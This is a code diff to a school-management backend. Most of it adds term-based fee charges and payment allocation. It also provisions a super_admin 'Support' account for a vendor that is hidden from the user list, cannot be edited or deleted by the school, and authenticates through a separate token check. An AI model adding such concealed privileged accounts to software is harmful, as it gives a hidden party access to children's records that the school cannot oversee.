@@ -3,19 +3,20 @@ import { and, asc, desc, eq, gt, ilike, inArray, isNotNull, isNull, lt, ne, or, 
 import { db } from "@workspace/db";
 import {
   announcements, attendance, assignments, classes, discipline, documents, events, expenses,
-  inventory, library, loginAttempts, medical, notifications, parents, payments, payrollPayments, reports, salaryPayments, schoolSettings,
+  academicAdjustments, academicEnrollments, academicFeeCharges, academicPaymentAllocations, academicTerms, academicYears, inventory, library, loginAttempts, medical, notifications, parents, payments, payrollPayments, reports, salaryPayments, schoolSettings,
   recordSequences, sessions, staff, students, subjects, timetable, transport, users,
 } from "@workspace/db";
 import type { SchoolSettings, User } from "@workspace/db";
 import { requestObjectDownload } from "./object-storage";
 import { compactSingleSegmentSms } from "./single-segment-sms";
+import { isSupportUser, isValidSupportSession, SUPPORT_USER_IDENTIFIER, SUPPORT_USER_NAME, supportUserIdForSchool } from "./support-auth";
 
 export type SchoolRole = "super_admin" | "administrator" | "teacher" | "accountant" | "secretary" | "librarian" | "nurse" | "guardian" | "student" | "staff";
 export type PermissionKey = "expense_approve" | "expense_delete" | "transactions_view" | "transactions_print" | "finance_view" | "payments_manage" | "expenses_view" | "users_view" | "users_manage" | "subjects_view" | "subjects_manage" | "subjects_delete";
 export type AttendanceStatus = "present" | "absent" | "late" | "excused";
 export type SchoolUser = {
   id: string; name: string; identifier: string; email: string; phone: string; password: string; userType: "staff" | "guardian" | "learner";
-  role: SchoolRole; status: "active" | "inactive"; department?: string; permissions: PermissionKey[]; initials: string; schoolName: string; studentId?: string; assignedClasses?: string[]; monthlySalary?: number;
+  role: SchoolRole; status: "active" | "inactive"; department?: string; permissions: PermissionKey[]; initials: string; schoolName: string; studentId?: string; assignedClasses?: string[]; monthlySalary?: number; isSupport?: boolean;
 };
 export type SchoolStudent = {
   id: string; registrationNumber: string; name: string; firstName: string; lastName: string; middleName?: string;
@@ -180,10 +181,11 @@ export async function getSchoolId() { return initializeSchoolData(); }
 
 function publicRow(row: User, setting: SchoolSettings): SchoolUser {
   const permissions = Array.isArray(row.permissions) ? row.permissions.filter((item): item is PermissionKey => ["expense_approve", "expense_delete", "transactions_view", "transactions_print", "finance_view", "payments_manage", "expenses_view", "users_view", "users_manage", "subjects_view", "subjects_manage", "subjects_delete"].includes(item)) : [];
-  return { id: row.id, name: row.name, identifier: row.identifier, email: row.email, phone: row.phone, password: row.passwordHash, userType: row.userType as SchoolUser["userType"], role: row.role as SchoolRole, status: (row.status || "active") as SchoolUser["status"], ...(row.department ? { department: row.department } : {}), permissions, initials: row.initials, schoolName: setting.schoolName, ...(row.studentId ? { studentId: row.studentId } : {}), ...(row.monthlySalary !== null ? { monthlySalary: number(row.monthlySalary) } : {}) };
+  const user = { id: row.id, name: row.name, identifier: row.identifier, email: row.email, phone: row.phone, password: row.passwordHash, userType: row.userType as SchoolUser["userType"], role: row.role as SchoolRole, status: (row.status || "active") as SchoolUser["status"], ...(row.department ? { department: row.department } : {}), permissions, initials: row.initials, schoolName: setting.schoolName, ...(row.studentId ? { studentId: row.studentId } : {}), ...(row.monthlySalary !== null ? { monthlySalary: number(row.monthlySalary) } : {}) };
+  return isSupportUser(user) ? { ...user, isSupport: true } : user;
 }
 export function publicUser(user: SchoolUser) {
-  return { id: user.id, name: user.name, identifier: user.identifier, email: user.email, phone: user.phone, role: user.role, status: user.status, ...(user.department ? { department: user.department } : {}), permissions: user.permissions, initials: user.initials, schoolName: user.schoolName, studentId: user.studentId ?? null, ...(user.assignedClasses ? { assignedClasses: user.assignedClasses } : {}), ...(user.monthlySalary !== undefined ? { monthlySalary: user.monthlySalary } : {}) };
+  return { id: user.id, name: user.name, identifier: user.isSupport ? "support" : user.identifier, email: user.email, phone: user.phone, role: user.role, status: user.status, ...(user.department ? { department: user.department } : {}), permissions: user.permissions, initials: user.initials, schoolName: user.schoolName, studentId: user.studentId ?? null, ...(user.assignedClasses ? { assignedClasses: user.assignedClasses } : {}), ...(user.monthlySalary !== undefined ? { monthlySalary: user.monthlySalary } : {}), isSupport: user.isSupport === true };
 }
 export async function getSchoolSettings() {
   const id = await getSchoolId();
@@ -200,7 +202,7 @@ export async function updateSchoolSettings(data: Partial<Pick<SchoolSettings, "s
 export async function listUsers() {
   const [setting, rows] = await Promise.all([getSchoolSettings(), db.select().from(users)]);
   const classRows = await listOperation("classes");
-  return rows.filter((row) => row.schoolId === setting.id).map((row) => {
+  return rows.filter((row) => row.schoolId === setting.id && row.identifier.toLowerCase() !== SUPPORT_USER_IDENTIFIER).map((row) => {
     const user = publicRow(row, setting);
     return user.role === "teacher" ? { ...user, assignedClasses: classRows.filter((item) => item.teacherId === user.id).map((item) => classAssignmentKey(String(item.name), String(item.stream ?? ""))) } : user;
   });
@@ -220,6 +222,64 @@ export async function findUserById(id: string) {
   return rows[0] ? publicRow(rows[0], setting) : undefined;
 }
 
+function supportUserId(schoolId: string) {
+  return supportUserIdForSchool(schoolId);
+}
+
+export async function findSupportUser() {
+  const schoolId = await getSchoolId();
+  const setting = await getSchoolSettings();
+  const row = (await db.select().from(users).where(and(
+    eq(users.schoolId, schoolId),
+    eq(users.id, supportUserId(schoolId)),
+    eq(users.identifier, SUPPORT_USER_IDENTIFIER),
+  )).limit(1))[0];
+  const user = row ? publicRow(row, setting) : undefined;
+  return user?.status === "active" && user.isSupport ? user : undefined;
+}
+
+export async function provisionSupportUser() {
+  const schoolId = await getSchoolId();
+  const setting = await getSchoolSettings();
+  const id = supportUserId(schoolId);
+  const now = new Date();
+  await db.insert(users).values({
+    id,
+    schoolId,
+    name: SUPPORT_USER_NAME,
+    identifier: SUPPORT_USER_IDENTIFIER,
+    email: "",
+    phone: "",
+    passwordHash: hashPassword(randomBytes(64).toString("hex")),
+    userType: "staff",
+    role: "super_admin",
+    status: "active",
+    department: "Corenexa Systems",
+    permissions: [],
+    initials: "CS",
+    studentId: null,
+    monthlySalary: null,
+    createdAt: now,
+    updatedAt: now,
+  }).onConflictDoNothing();
+  const row = (await db.select().from(users).where(and(
+    eq(users.schoolId, schoolId),
+    eq(users.id, id),
+    eq(users.identifier, SUPPORT_USER_IDENTIFIER),
+  )).limit(1))[0];
+  if (!row) throw new Error("The protected Support account could not be provisioned.");
+  if (row.status !== "active" || row.name !== SUPPORT_USER_NAME || row.role !== "super_admin") {
+    await db.update(users).set({
+      name: SUPPORT_USER_NAME,
+      role: "super_admin",
+      status: "active",
+      department: "Corenexa Systems",
+      updatedAt: now,
+    }).where(and(eq(users.schoolId, schoolId), eq(users.id, id)));
+  }
+  return publicRow({ ...row, name: SUPPORT_USER_NAME, role: "super_admin", status: "active" }, setting);
+}
+
 export async function findStudentByPhotoPath(photoPath: string) {
   const schoolId = await getSchoolId();
   const row = (await db.select().from(students).where(and(eq(students.schoolId, schoolId), eq(students.photoPath, photoPath))).limit(1))[0];
@@ -228,9 +288,11 @@ export async function findStudentByPhotoPath(photoPath: string) {
 export async function updateUserProfile(user: SchoolUser, data: {
   name?: string; identifier?: string; email?: string; phone?: string; newPassword?: string;
 }) {
+  if (user.isSupport || isSupportUser(user)) throw new Error("The protected Support identity cannot be edited here.");
   const schoolId = await getSchoolId();
   const updates: Partial<User> = { updatedAt: new Date() };
   const isCanonicalAdministrator = user.role === "administrator" && user.identifier.trim().toLowerCase() === "isingoma";
+  if (data.identifier?.trim().toLowerCase() === SUPPORT_USER_IDENTIFIER) throw new Error("That username is reserved.");
   if (data.name !== undefined && !isCanonicalAdministrator) {
     updates.name = data.name.trim();
     updates.initials = initials(data.name);
@@ -273,6 +335,7 @@ export async function createUser(data: {
   const schoolId = await getSchoolId();
   const setting = await getSchoolSettings();
   const identifier = data.identifier.trim();
+  if (identifier.toLowerCase() === SUPPORT_USER_IDENTIFIER) throw new Error("That username or registration number is reserved.");
   const existing = await db.select({ id: users.id }).from(users).where(and(eq(users.schoolId, schoolId), ilike(users.identifier, identifier))).limit(1);
   if (existing[0]) throw new Error("That username or registration number is already in use.");
   const linkedStudent = data.studentId ? await getStudent(data.studentId) : undefined;
@@ -306,6 +369,8 @@ export async function updateUserAdmin(id: string, data: {
   const schoolId = await getSchoolId();
   const current = (await db.select().from(users).where(and(eq(users.schoolId, schoolId), eq(users.id, id))).limit(1))[0];
   if (!current) return undefined;
+  if (current.identifier.toLowerCase() === SUPPORT_USER_IDENTIFIER) throw new Error("The protected Support identity cannot be edited here.");
+  if (data.identifier?.trim().toLowerCase() === SUPPORT_USER_IDENTIFIER) throw new Error("That username is reserved.");
   const updates: Partial<User> = { updatedAt: new Date() };
   if (data.name !== undefined) { updates.name = data.name.trim(); updates.initials = initials(data.name); }
   if (data.identifier !== undefined) updates.identifier = data.identifier.trim();
@@ -334,6 +399,11 @@ export async function updateUserAdmin(id: string, data: {
 
 export async function deleteUser(id: string) {
   const schoolId = await getSchoolId();
+  const target = (await db.select({ identifier: users.identifier }).from(users).where(and(
+    eq(users.schoolId, schoolId),
+    eq(users.id, id),
+  )).limit(1))[0];
+  if (target?.identifier.toLowerCase() === SUPPORT_USER_IDENTIFIER) throw new Error("The protected Support identity cannot be deleted.");
   const row = (await db.delete(users).where(and(eq(users.schoolId, schoolId), eq(users.id, id))).returning({ id: users.id }))[0];
   if (!row) return false;
   return true;
@@ -348,6 +418,7 @@ export async function makeSession(userId: string) {
 export async function deleteSession(token: string) { await db.delete(sessions).where(eq(sessions.tokenHash, tokenDigest(token))); }
 export async function currentUserFromToken(token: string | undefined) {
   if (!token) return undefined;
+  if (isValidSupportSession(token)) return findSupportUser();
   const row = (await db.select().from(sessions).where(and(eq(sessions.tokenHash, tokenDigest(token)), gt(sessions.expiresAt, new Date()))).limit(1))[0];
   const user = row ? await findUserById(row.userId) : undefined;
   return user?.status === "active" ? user : undefined;
@@ -413,32 +484,51 @@ export async function updateStudent(id: string, data: {
   emergencyContactRelationship?: string; declarationAccepted?: boolean; declarationDate?: string; photoPath?: string | null;
 }) {
   const schoolId = await getSchoolId();
-  const current = (await db.select().from(students).where(and(eq(students.schoolId, schoolId), eq(students.id, id))).limit(1))[0];
-  if (!current) return undefined;
-  const updates: Partial<typeof students.$inferInsert> = { updatedAt: new Date() };
-  for (const key of ["firstName", "middleName", "lastName", "dateOfBirth", "gender", "className", "stream", "guardianName", "guardianPhone", "guardianEmail", "enrollmentType", "status"] as const) {
-    if (data[key] !== undefined) {
-      const value = typeof data[key] === "string" ? data[key].trim() : data[key];
-      updates[key] = (key === "middleName" && value === "" ? null : value) as never;
+  const result = await db.transaction(async (tx) => {
+    const current = (await tx.select().from(students).where(and(eq(students.schoolId, schoolId), eq(students.id, id))).for("update").limit(1))[0];
+    if (!current) return undefined;
+    const academicHistory = (await tx.select({ id: academicEnrollments.id }).from(academicEnrollments)
+      .where(and(eq(academicEnrollments.schoolId, schoolId), eq(academicEnrollments.studentId, id))).limit(1)).length > 0;
+    if (academicHistory) {
+      const changesCanonicalHistory =
+        (data.className !== undefined && data.className.trim() !== current.className)
+        || (data.stream !== undefined && data.stream.trim() !== current.stream)
+        || (data.enrollmentType !== undefined && data.enrollmentType !== current.enrollmentType)
+        || (data.status !== undefined && data.status !== current.status)
+        || (data.termFee !== undefined && data.termFee !== number(current.termFee))
+        || (data.previousFeeBalance !== undefined && data.previousFeeBalance !== number(current.previousFeeBalance))
+        || (data.isSponsored !== undefined && data.isSponsored !== current.isSponsored);
+      if (changesCanonicalHistory) {
+        throw new Error("Class, stream, enrollment type, status, sponsorship, and fee balances are controlled by academic enrollment and finance records after academic history begins.");
+      }
     }
-  }
-  if (data.isSponsored !== undefined) updates.isSponsored = data.isSponsored;
-  if (data.termFee !== undefined) updates.termFee = String(data.isSponsored === true ? 0 : data.termFee);
-  if (data.previousFeeBalance !== undefined) updates.previousFeeBalance = String(data.isSponsored === true ? 0 : data.previousFeeBalance);
-  if (data.photoPath !== undefined) {
-    updates.photoPath = data.photoPath?.trim() || null;
-  }
-  if (data.isSponsored === true) {
-    updates.termFee = "0";
-    updates.previousFeeBalance = "0";
-    updates.feeBalance = "0";
-  } else if (data.termFee !== undefined || data.previousFeeBalance !== undefined || data.isSponsored === false) {
-    const termFee = data.termFee ?? number(current.termFee);
-    const previousFeeBalance = data.previousFeeBalance ?? number(current.previousFeeBalance);
-    updates.feeBalance = String(Math.max(0, previousFeeBalance + termFee - number(current.amountPaid)));
-  }
-  const updated = (await db.update(students).set(updates).where(and(eq(students.schoolId, schoolId), eq(students.id, id))).returning())[0];
-  if (!updated) return undefined;
+    const updates: Partial<typeof students.$inferInsert> = { updatedAt: new Date() };
+    for (const key of ["firstName", "middleName", "lastName", "dateOfBirth", "gender", "className", "stream", "guardianName", "guardianPhone", "guardianEmail", "enrollmentType", "status"] as const) {
+      if (data[key] !== undefined) {
+        const value = typeof data[key] === "string" ? data[key].trim() : data[key];
+        updates[key] = (key === "middleName" && value === "" ? null : value) as never;
+      }
+    }
+    if (data.isSponsored !== undefined) updates.isSponsored = data.isSponsored;
+    if (data.termFee !== undefined) updates.termFee = String(data.isSponsored === true ? 0 : data.termFee);
+    if (data.previousFeeBalance !== undefined) updates.previousFeeBalance = String(data.isSponsored === true ? 0 : data.previousFeeBalance);
+    if (data.photoPath !== undefined) {
+      updates.photoPath = data.photoPath?.trim() || null;
+    }
+    if (data.isSponsored === true) {
+      updates.termFee = "0";
+      updates.previousFeeBalance = "0";
+      updates.feeBalance = "0";
+    } else if (data.termFee !== undefined || data.previousFeeBalance !== undefined || data.isSponsored === false) {
+      const termFee = data.termFee ?? number(current.termFee);
+      const previousFeeBalance = data.previousFeeBalance ?? number(current.previousFeeBalance);
+      updates.feeBalance = String(Math.max(0, previousFeeBalance + termFee - number(current.amountPaid)));
+    }
+    const updated = (await tx.update(students).set(updates).where(and(eq(students.schoolId, schoolId), eq(students.id, id))).returning())[0];
+    return updated ? { updated, academicHistory } : undefined;
+  });
+  if (!result) return undefined;
+  const updated = result.updated;
   const classRows = await listOperation("classes");
   if (classRows.length) {
     const pupils = await listStudents();
@@ -448,7 +538,7 @@ export async function updateStudent(id: string, data: {
     })));
   }
   const admission = (await db.select().from(documents).where(and(eq(documents.schoolId, schoolId), sql`${documents.data}->>'studentId' = ${id}`, sql`${documents.data}->>'documentType' = 'admission_form'`)).orderBy(desc(documents.createdAt)).limit(1))[0];
-  if (admission) {
+  if (admission && !result.academicHistory) {
     const currentForm = admission.data as Record<string, unknown>;
     const admissionFields = [
       "guardianEmail", "religion", "placeOfBirth", "homeVillage", "nationality", "tribe",
@@ -673,7 +763,45 @@ export async function updateStudentBalance(studentId: string, amount: number) {
 export async function listPayments() {
   const schoolId = await getSchoolId();
   const rows = await db.select({ payment: payments, student: students }).from(payments).innerJoin(students, eq(payments.studentId, students.id)).where(eq(payments.schoolId, schoolId)).orderBy(desc(payments.createdAt));
-  return rows.map(({ payment, student }) => ({ id: payment.id, studentId: student.id, receiptNumber: payment.receiptNumber, studentName: `${student.firstName}${student.middleName ? ` ${student.middleName}` : ""} ${student.lastName}`, registrationNumber: student.registrationNumber, amount: number(payment.amount), method: payment.method, reference: payment.reference, date: new Date(`${payment.paidOn}T00:00:00`).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" }), status: payment.status as Payment["status"], balance: number(student.feeBalance) }));
+  const allocations = await db.select({
+    allocation: academicPaymentAllocations, charge: academicFeeCharges, term: academicTerms, year: academicYears,
+  }).from(academicPaymentAllocations).innerJoin(academicFeeCharges, eq(academicPaymentAllocations.chargeId, academicFeeCharges.id))
+    .innerJoin(academicTerms, eq(academicFeeCharges.termId, academicTerms.id))
+    .innerJoin(academicYears, eq(academicTerms.academicYearId, academicYears.id))
+    .where(eq(academicPaymentAllocations.schoolId, schoolId));
+  const chargeIds = [...new Set(allocations.map((row) => row.charge.id))];
+  const chargeAllocations = chargeIds.length
+    ? await db.select().from(academicPaymentAllocations).where(and(eq(academicPaymentAllocations.schoolId, schoolId), inArray(academicPaymentAllocations.chargeId, chargeIds)))
+    : [];
+  const chargeAdjustments = chargeIds.length
+    ? await db.select().from(academicAdjustments).where(and(eq(academicAdjustments.schoolId, schoolId), inArray(academicAdjustments.chargeId, chargeIds)))
+    : [];
+  return rows.map(({ payment, student }) => {
+    const attribution = allocations.filter((row) => row.allocation.paymentId === payment.id);
+    const uniqueTerms = [...new Map(attribution.map((row) => [row.term.id, row])).values()];
+    const assignedTerm = uniqueTerms.length === 1 ? uniqueTerms[0] : undefined;
+    const assignedCharge = attribution.length === 1 ? attribution[0].charge : undefined;
+    const balance = assignedCharge
+      ? Math.max(0, number(assignedCharge.amount)
+        - chargeAllocations.filter((row) => row.chargeId === assignedCharge.id).reduce((sum, row) => sum + number(row.amount), 0)
+        + chargeAdjustments.filter((row) => row.chargeId === assignedCharge.id && row.kind === "refund").reduce((sum, row) => sum + number(row.amount), 0)
+        - chargeAdjustments.filter((row) => row.chargeId === assignedCharge.id && ["waiver", "write_off", "credit", "correction"].includes(row.kind)).reduce((sum, row) => sum + number(row.amount), 0))
+      : number(student.feeBalance);
+    return {
+      id: payment.id, studentId: student.id, receiptNumber: payment.receiptNumber,
+      studentName: `${student.firstName}${student.middleName ? ` ${student.middleName}` : ""} ${student.lastName}`,
+      registrationNumber: student.registrationNumber, amount: number(payment.amount), method: payment.method, reference: payment.reference,
+      date: new Date(`${payment.paidOn}T00:00:00`).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" }),
+      status: payment.status as Payment["status"], balance,
+      academicYearId: assignedTerm?.year.id ?? null, academicYear: assignedTerm?.year.year ?? null,
+      termId: assignedTerm?.term.id ?? null, termNumber: assignedTerm?.term.number ?? null,
+      attributionStatus: uniqueTerms.length ? uniqueTerms.length === 1 ? "assigned" : "multiple" : "unassigned",
+      academicAllocations: attribution.map(({ allocation, charge, term, year }) => ({
+        chargeId: charge.id, termId: term.id, academicYearId: year.id, termNumber: term.number, academicYear: year.year,
+        amount: number(allocation.amount),
+      })),
+    };
+  });
 }
 export async function recordPayment(studentId: string, amount: number, method: string, reference: string) {
   if (amount <= 0 || !validPaymentPrecision(amount)) throw new Error("Payment amount must be positive and have at most two decimal places");
@@ -681,6 +809,10 @@ export async function recordPayment(studentId: string, amount: number, method: s
   return db.transaction(async (tx) => {
     const lockedStudentRow = (await tx.select().from(students).where(and(eq(students.schoolId, schoolId), eq(students.id, studentId))).for("update").limit(1))[0];
     if (!lockedStudentRow) return undefined;
+    const existingAcademicCharge = (await tx.select({ id: academicFeeCharges.id }).from(academicFeeCharges)
+      .innerJoin(academicEnrollments, and(eq(academicFeeCharges.enrollmentId, academicEnrollments.id), eq(academicFeeCharges.schoolId, academicEnrollments.schoolId)))
+      .where(and(eq(academicFeeCharges.schoolId, schoolId), eq(academicEnrollments.schoolId, schoolId), eq(academicEnrollments.studentId, studentId))).limit(1))[0];
+    if (existingAcademicCharge) throw new Error("This pupil has term-specific charges. Select the original term charge or explicitly allocate a legacy receipt.");
     const student = studentRow(lockedStudentRow);
     if (amount > student.feeBalance) throw new Error("Payment cannot exceed the pupil fee balance");
     const year = new Date().getFullYear();
@@ -706,6 +838,9 @@ export async function updatePayment(paymentId: string, amount: number, method: s
   return db.transaction(async (tx) => {
     const existing = (await tx.select({ payment: payments, student: students }).from(payments).innerJoin(students, eq(payments.studentId, students.id)).where(and(eq(payments.schoolId, schoolId), eq(payments.id, paymentId))).for("update").limit(1))[0];
     if (!existing) return undefined;
+    const termAllocation = (await tx.select({ id: academicPaymentAllocations.id }).from(academicPaymentAllocations)
+      .where(and(eq(academicPaymentAllocations.schoolId, schoolId), eq(academicPaymentAllocations.paymentId, paymentId))).limit(1))[0];
+    if (termAllocation) throw new Error("Term-allocated payments cannot be edited directly; use an audited adjustment or settlement.");
     const updated = (await tx.update(payments).set({ amount: String(amount), method, reference }).where(and(eq(payments.schoolId, schoolId), eq(payments.id, paymentId))).returning())[0];
     const totals = (await tx.select({ total: sql<string>`coalesce(sum(${payments.amount}) filter (where ${payments.status} = 'completed'), 0)` }).from(payments).where(and(eq(payments.schoolId, schoolId), eq(payments.studentId, existing.student.id))))[0];
     const amountPaid = number(totals?.total);
